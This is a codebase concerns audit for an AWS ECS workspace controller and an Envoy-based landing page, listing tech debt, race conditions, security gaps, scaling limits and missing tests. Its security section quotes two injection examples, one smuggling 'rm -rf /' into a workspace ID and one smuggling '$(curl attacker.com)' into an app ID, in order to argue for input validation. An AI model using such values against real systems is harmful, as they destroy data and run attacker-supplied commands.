# Codebase Concerns

**Analysis Date:** 2026-03-30

## Tech Debt

**Monolithic controller with bidirectional dependencies:**
- Issue: `controller-python/main.py` (923 lines) combines ECS task definitions, IAM role creation, ALB target group management, listener rules, app task polling, and Envoy route registration in a single file with circular dependencies between functions
- Files: `controller-python/main.py` (lines 1-923)
- Impact: Adding new features requires understanding all AWS service interactions; debugging failures requires tracing through 12+ polling loops and 10+ exception handlers; testing individual components is difficult without mocking entire AWS SDK
- Fix approach: Extract into layers — `ecs_tasks.py` (task defs + task management), `alb_routing.py` (ALB rules + TGs), `envoy_routes.py` (landing page API calls), `polling.py` (wait_for_* functions). Each layer has a single responsibility and can be tested independently.

**Hardcoded wait timeouts and retry counts:**
- Issue: Polling loops in `controller-python/main.py` use fixed retries (24, 12, 3) and fixed delays (5s, 2s) without exponential backoff. For example, `wait_for_task_running` (line 577) retries 24 times with 5s delay = ~2 minutes max wait; if ECS is slow, bootstrap fails instead of backing off gracefully
- Files: `controller-python/main.py` lines 577, 591, 609
- Impact: Service degradation in high-load scenarios where task scheduling takes >2 minutes; bootstrap failures are not retryable from client side without full re-bootstrap
- Fix approach: Implement exponential backoff (1s, 2s, 4s, 8s...) capped at 30s delay; allow configurable max wait via environment variables; return structured error (status code 202 Accepted, polling URL) for long-running operations instead of blocking HTTP requests.

**No idempotency checks in bootstrap flow:**
- Issue: `bootstrap_workspace` (line 695) creates IAM role, task definitions, services, target groups, and listener rules sequentially. If bootstrap fails at step 5/8, re-running bootstrap from the client re-creates all resources from step 1, causing duplicate task definitions and wasted AWS API calls
- Files: `controller-python/main.py` lines 695-778
- Impact: Failed bootstraps require manual cleanup (`make cleanup-aws`); rapid retry attempts (HTTP 500 followed by re-POST) create multiple task definition revisions and IAM policies
- Fix approach: Add idempotency key (workspace_id + timestamp hash) as ALB rule tag; check if workspace already bootstrapped before starting steps; return existing IDs if steps 1-4 already complete; continue from the last incomplete step.

**Bare exception handlers with generic logging:**
- Issue: Multiple try/except blocks catch `Exception` broadly without determining cause — see lines 28-30, 403, 486, 502, 585, 603, 621, 654, 666, 679, 697, 797. Example: `except Exception as e: log.warning(...)` does not distinguish between timeout, authentication failure, invalid workspace_id, or AWS API throttling
- Files: `controller-python/main.py` (20+ instances across bootstrap, start_app, stop_app, list_workspace_apps)
- Impact: Client receives generic 500 errors; debugging requires reading server logs; transient errors (throttling) are not retried automatically; invalid inputs (bad workspace_id) return 500 instead of 400 Bad Request
- Fix approach: Create custom exception types (`BootstrapAlreadyRunning`, `TaskDefinitionNotFound`, `AWSThrottling`, `InvalidWorkspaceId`); catch specific exceptions; return appropriate HTTP status codes (400, 409, 429, 500).

## Known Bugs

**Race condition: Workspace IP lookup can return stale task after service restart:**
- Symptoms: After restarting workspace service, `/app/start` calls `get_landing_page_ip()` (line 639) which lists running tasks and gets IP. If the old task is still draining and new task is starting, function may return IP of draining task; Envoy route registration then fails to reach new landing page
- Files: `controller-python/main.py` lines 639-644
- Trigger: Restart workspace service (e.g., via `ensure_workspace_service` update), immediately call `/app/start` before old task fully stops
- Workaround: Explicit task ARN comparison with service desiredCount before returning IP; add 2-3s delay after seeing RUNNING status to allow ENI attachment
- Fix approach: Change `get_landing_page_ip` to verify task is in newest task definition generation; add liveness check (HTTP HEAD /healthz) before registering route.

**Envoy route registration fails silently on internal/routes/add timeout:**
- Symptoms: Bootstrap completes with "app started" status, but Envoy has no route for the app (route table is empty). User sees 502 Bad Gateway when accessing app URL
- Files: `controller-python/main.py` line 650 (POST with timeout=10); `ui-nodejs/workspace-landing/server.js` line 143 (POST /internal/routes/add)
- Trigger: Heavy load on landing page container; network latency between controller and workspace task; landing page slow to process route addition
- Workaround: Manual POST to landing page `/internal/routes/add` with app details
- Fix approach: Implement retry with exponential backoff in `register_app_route`; add circuit breaker pattern for landing page connectivity; return 202 Accepted if route registration queued but not confirmed; client polls `/internal/routes` endpoint to confirm.

**Node.js landing page can crash during concurrent route updates:**
- Symptoms: After starting multiple apps rapidly, some routes disappear from Envoy config; `kill -SIGHUP` fails silently, Envoy does not reload config
- Files: `ui-nodejs/workspace-landing/server.js` lines 108-132 (writeEnvoyConfig, reloadEnvoy)
- Trigger: Concurrent POST requests to `/internal/routes/add` from controller while `fs.writeFileSync` is writing config and `execSync` is signaling Envoy
- Workaround: Sequential app starts with 2s delay between each `/app/start` call
- Fix approach: Use a mutex/lock around config write and reload; queue route updates; confirm Envoy reloaded before returning 200 OK.

## Security Considerations

**AWS IAM role policy uses overly broad Resource:*** wildcard in the condition:**
- Risk: App task role (line 207-228) allows `ecs:DescribeTasks` and `ecs:DescribeTaskDefinition` with Resource="*" and a Condition on cluster ARN. This is acceptable because the condition restricts to the target cluster, but if the condition is ever removed, tasks can describe ANY ECS resources across the AWS account
- Files: `controller-python/main.py` lines 207-228
- Current mitigation: Condition blocks resource access to the target cluster; no S3/EFS permissions granted
- Recommendations: Add explicit Resource ARN restriction scoped to task ARN pattern `arn:aws:ecs:{region}:{account}:task/{cluster}/{taskId}` instead of `*`. Document why wildcard + condition is acceptable.

**controller-python runs with full AWS credentials mounted:**
- Risk: Docker container (`controller-python/Dockerfile`) mounts `~/.aws:/root/.aws:ro` to access AWS credentials. If container is compromised (RCE), attacker has full AWS permissions of the user running docker
- Files: `controller-python/Makefile` line 13 (volume mount), `controller-python/Dockerfile` lines 1-15
- Current mitigation: None. Container runs with read-only home directory, but credentials are still readable
- Recommendations: Use IAM instance profile (if running on EC2) or AWS SigV4 request signing; store credentials in AWS Secrets Manager, not mounted files. Use temporary STS credentials with shorter TTL.

**No input validation on workspace_id or app_id:**
- Risk: Client sends `workspaceId="foo; rm -rf /"` or `appId="$(curl attacker.com)"`. These are used in Envoy config generation (`ui-nodejs/workspace-landing/server.js` line 30), Docker command construction, and IAM role names without sanitization
- Files: `controller-python/main.py` lines 710, 833, 901; `ui-nodejs/workspace-landing/server.js` lines 28-52
- Current mitigation: No documented validation; Envoy config generation uses string interpolation directly
- Recommendations: Add regex validation (alphanumeric + dash only) in Pydantic models; reject IDs > 63 chars (AWS name limits); escape values used in Envoy YAML/JSON.

**Landing page internal API (/internal/routes/add) not protected:**
- Risk: Endpoints at `ui-nodejs/workspace-landing/server.js` lines 138-166 have no authentication. Any HTTP client that can reach the landing page container (inside VPC, so limited, but any running container in the cluster) can add/remove arbitrary Envoy routes
- Files: `ui-nodejs/workspace-landing/server.js` lines 138-166
- Current mitigation: Endpoints only accessible from private subnet; ALB does not expose them; controller has direct network access (by design)
- Recommendations: Add simple bearer token check (e.g., env var INTERNAL_API_KEY passed in X-Internal-Token header); use mTLS between controller and landing page if authentication becomes complex.

## Performance Bottlenecks

**Bootstrap HTTP request can block for 120+ seconds:**
- Problem: `bootstrap_workspace` (line 695) sequentially waits for 8+ AWS operations, each with polling loops. Total time = (24 retries × 5s delay) + (12 retries × 5s delay) + Envoy reload + landing page HTTP POST timeout. If any step is slow, entire request hangs
- Files: `controller-python/main.py` lines 695-778
- Cause: All operations are sequential; no parallelization of task definition registration + service creation; HTTP client blocks while waiting for task IP
- Improvement path: Start task definition registration and service creation in parallel threads; use asyncio for HTTP requests to landing page; implement long-polling or webhooks instead of blocking HTTP requests.

**Landing page Envoy config rebuild on every route add/remove:**
- Problem: Each `/internal/routes/add` POST (line 143 in server.js) rebuilds entire Envoy config file with all routes, even if only one route changed. With 100 apps, config rebuilds 100 times during bootstrap
- Files: `ui-nodejs/workspace-landing/server.js` lines 108-152
- Cause: String interpolation rebuilds the entire YAML file; no delta updates
- Improvement path: Use a template engine (Handlebars, Jinja2) that writes only changed routes; implement Envoy dynamic config API instead of file rewrites.

**Polling interval of 5s is too aggressive for small delays, too slow for large workloads:**
- Problem: `wait_for_task_running` retries every 5 seconds for 120s total. For a quick task startup (2s), this wastes 3 seconds of blocking. For slow startups (AWS scheduler backlog), 120s may not be enough
- Files: `controller-python/main.py` lines 577, 591, 609
- Cause: Fixed delay; no jitter or adaptive backoff
- Improvement path: Start with 1s interval, increase exponentially (1s, 2s, 4s, 8s, 16s) up to 30s; add jitter (random 0-500ms) to prevent thundering herd if multiple requests poll simultaneously.

## Fragile Areas

**Envoy configuration is synchronized via file write + SIGHUP, not event-driven:**
- Files: `ui-nodejs/workspace-landing/server.js` lines 108-128
- Why fragile: If `fs.writeFileSync` succeeds but `execSync('kill -SIGHUP')` fails (process died, wrong PID, permission denied), config is written but not reloaded. Envoy runs old config silently. Multiple concurrent route updates can overwrite each other's changes in the race window between read-modify-write
- Safe modification: Add explicit state check before return (e.g., verify Envoy reloaded by reading its stats endpoint); implement config versioning so Envoy can detect stale configs; use a queue to ensure serial config updates.
- Test coverage: No tests for concurrent route additions; no tests for Envoy reload failure recovery.

**IAM role creation idempotency depends on exception handling:**
- Files: `controller-python/main.py` lines 231-247
- Why fragile: If role already exists, code catches `iam.exceptions.EntityAlreadyExistsException` and continues. But `put_role_policy` (line 243) always overwrites the policy. If the policy changes between bootstrap attempts, the second attempt silently applies a different policy without warning
- Safe modification: Explicitly check if role exists before creation; if it does, verify the policy matches the expected version; fail loudly if versions diverge.
- Test coverage: No tests for re-bootstrap on the same workspace; no tests for policy version mismatches.

**App task registration relies on task definition tags to store metadata:**
- Files: `controller-python/main.py` lines 372-378 (app_def stored as tags in task definition)
- Why fragile: App type is stored as a tag and retrieved later (line 856-857) during `/app/start`. If tags are not propagated correctly (ECS edge case), or if someone manually modifies the task definition, app type becomes unknown and defaults to "custom". App then runs with wrong port/command
- Safe modification: Store app metadata in a separate DynamoDB table or JSON file in EFS; include metadata in the response from bootstrap so client can cache it; validate app type matches expected type on app start.
- Test coverage: No tests for tag propagation; no tests for bootstrap with duplicate app IDs.

**Landing page container depends on Envoy being slow to start:**
- Files: `controller-python/main.py` line 271 (sleep loop waiting for config file)
- Why fragile: Envoy startup command blocks until `/etc/envoy/envoy.yaml` is written. If landing page crashes before writing config, Envoy never starts. If landing page and Envoy crash at the same time, task fails to reach healthy state
- Safe modification: Use init container to generate baseline Envoy config before starting landing page; use a volume mount that is pre-populated; implement health check that confirms both containers are running before declaring task healthy.
- Test coverage: No tests for landing page startup failure; no tests for Envoy crash recovery.

## Scaling Limits

**Current architecture supports ~100-500 workspaces before hitting AWS API rate limits:**
- Current capacity: Tested with ~5 workspaces; each workspace bootstrap makes ~30 AWS API calls (ECS, IAM, ALB, ELBv2). At 100 workspaces, bootstrap phase makes 3,000 API calls in parallel
- Limit: AWS ECS API has default rate limit of 100 calls/second per account; ALB has 150 calls/second; IAM has 100 calls/second. Bootstrap parallelization would hit limits around 100-200 concurrent workspaces
- Scaling path: Implement exponential backoff with jitter for AWS API retries; batch operations (e.g., CreateMultipleListenerRules if AWS API supports it); cache task definitions so re-bootstrap doesn't re-register identical definitions; use AWS CloudFormation or CDK for bulk provisioning instead of sequential boto3 calls.

**Landing page Envoy process memory grows linearly with app count:**
- Current capacity: Each route = ~50 bytes in Envoy config; with 100 apps, config ~5KB. Envoy memory footprint ~30-50MB per hundred apps at baseline
- Limit: Fargate task limited to 512MB memory (line 369). At ~1000 apps, Envoy + landing page Node.js would consume ~100MB config + 50MB Envoy + 30MB Node.js = 180MB, leaving 332MB. Sustainable up to ~5000 apps if memory usage scales linearly
- Scaling path: Implement sharded Envoy instances (one per 500 apps); replace Envoy with a cloud-native service mesh (Istio, AWS App Mesh); implement read-only config replicas that other workspaces inherit from.

**ALB listener rules are capped at 100-400 for workspace rules, then custom rules below that:**
- Current capacity: ALB supports ~1000 listener rules per listener. Current design reserves priority 100-399 for workspace rules (300 slots). With rule count approaching limit, finding available priority becomes O(n) search
- Limit: Hard limit of 1000 rules per listener; if reached, no new workspaces can be added
- Scaling path: Pre-allocate rule blocks per workspace (e.g., workspace 1 gets rules 1-3, workspace 2 gets rules 4-6); use ALB target group attributes to route to multiple TGs instead of separate rules; implement a separate ALB per set of 200 workspaces.

## Dependencies at Risk

**No versioning on dependencies — all pinned to caret ranges:**
- Risk: `controller-python/requirements.txt` specifies `fastapi`, `boto3`, `httpx` without version pins. Breaking changes in major versions (e.g., fastapi 1.x → 2.x removed deprecated APIs) could break controller without warning
- Files: `controller-python/requirements.txt`
- Impact: `make api-rebuild` may pull incompatible versions; no reproducible builds across team members
- Migration plan: Pin to explicit versions (e.g., `boto3==1.28.85`, `fastapi==0.104.1`); use `pip freeze` to generate lockfile; update quarterly with security patches.

**Node.js dependencies are outdated:**
- Risk: `ui-nodejs/package.json` specifies `express@^4.18.2` (released Jan 2023, now 4.18.3 current) and `body-parser@^1.20.2` (deprecated, merged into express 4.16.0+). Caret range allows breaking changes
- Files: `ui-nodejs/package.json`
- Impact: `npm install` may pull incompatible express version; body-parser deprecation may cause issues in future Node.js versions
- Migration plan: Update to latest (express 4.18.3, body-parser 1.20.2); remove body-parser (use `express.json()` instead); run `npm audit` and address security warnings; use `package-lock.json` to ensure reproducible installs.

**boto3 IAM error handling depends on specific exception types:**
- Risk: Code catches `iam.exceptions.EntityAlreadyExistsException` (line 239). If AWS SDK changes exception type or boto3 version changes exception module structure, code breaks
- Files: `controller-python/main.py` line 239
- Impact: Role creation logic fails silently if exception structure changes; no fallback handling
- Migration plan: Add version constraints on boto3; implement try/except around exception class access with fallback to string matching on error message; add unit tests that mock boto3 exceptions.

## Missing Critical Features

**No way to scale apps within a workspace (CPU/memory constraints):**
- Problem: Each app task is registered with fixed CPU (256) and memory (512MB). If an app exceeds this (memory leak, high traffic), task is OOMKilled. User cannot increase task size without manual intervention
- Blocks: Complex workloads (data analysis, ML inference) that need >512MB
- Missing: API endpoint to reconfigure app task CPU/memory; UI to adjust resource allocation; monitoring dashboard to show app resource usage

**No app restart or crash recovery:**
- Problem: If an app container crashes, task is marked STOPPED; user must call `/app/start` to restart. During outage, all users lose access
- Blocks: Production reliability; SLA compliance; high-availability deployments
- Missing: Auto-restart on crash (ECS restart policy); health checks that restart unhealthy tasks; circuit breaker in Envoy to fail fast instead of retrying failed connections

**No app logging or debugging interface:**
- Problem: App logs go to CloudWatch `/ecs/app-tester` log group; user has no way to view them from the UI or API
- Blocks: Debugging failed app startups; understanding app crashes
- Missing: CloudWatch log stream viewer in UI; tail logs endpoint in API; structured logging with request IDs

**No multi-cloud or multi-region support:**
- Problem: Architecture is hardcoded to AWS ECS in eu-west-1. Cannot deploy to other regions or cloud providers
- Blocks: Disaster recovery; local testing; deployment flexibility
- Missing: Config-driven region selection; abstraction layer for container orchestration (not ECS-specific); terraform workspaces for multi-region management

## Test Coverage Gaps

**Bootstrap flow has no unit tests:**
- What's not tested: Happy path bootstrap (all steps succeed); partial failure (e.g., TG creation fails, app task def succeeds); concurrent bootstraps of same workspace; bootstrap with 0 apps, 1 app, 100 apps
- Files: `controller-python/main.py` lines 695-778 (bootstrap_workspace)
- Risk: Regressions silently break the core API; discovered only during live testing; bootstrap refactoring is risky
- Priority: High — bootstrap is the critical user journey

**Envoy route registration has no tests:**
- What's not tested: Route add succeeds; route add fails with timeout (landing page down); route add partially succeeds (config written, SIGHUP fails); concurrent route adds
- Files: `ui-nodejs/workspace-landing/server.js` lines 143-166; `controller-python/main.py` lines 646-668
- Risk: Silent failures result in routes not reaching Envoy; users see 502 errors without knowing why
- Priority: High — affects all app start operations

**Polling and timeout logic has no tests:**
- What's not tested: Task reaches RUNNING in 2s (polling completes early); task takes 90s to start (retries exhaust, returns None); task crashes partway through wait (detects STOPPED status); network errors during polling (retries and succeeds)
- Files: `controller-python/main.py` lines 577-625 (wait_for_task_*, wait_for_task_ip)
- Risk: Timeout behavior is unpredictable; difficult to debug in production
- Priority: Medium — affects robustness during high load

**Error handling paths are untested:**
- What's not tested: Invalid workspace_id (alphanumeric validation); missing infrastructure-outputs.json (INFRA_OUTPUTS fallback); AWS API throttling (retry logic); bad Pydantic model input (validation error response)
- Files: `controller-python/main.py` lines 1-50, 695-923
- Risk: Edge cases produce cryptic errors; no logging of what failed
- Priority: Medium — affects debugging and user experience

**No end-to-end integration tests:**
- What's not tested: Full bootstrap → app start → access app URL → app stop → cleanup flow
- Files: entire `controller-python/` and `ui-nodejs/`
- Risk: Regressions cascade across multiple components; integration issues only found during manual testing
- Priority: Medium — requires AWS environment (costly to run in CI)

---

*Concerns audit: 2026-03-30*
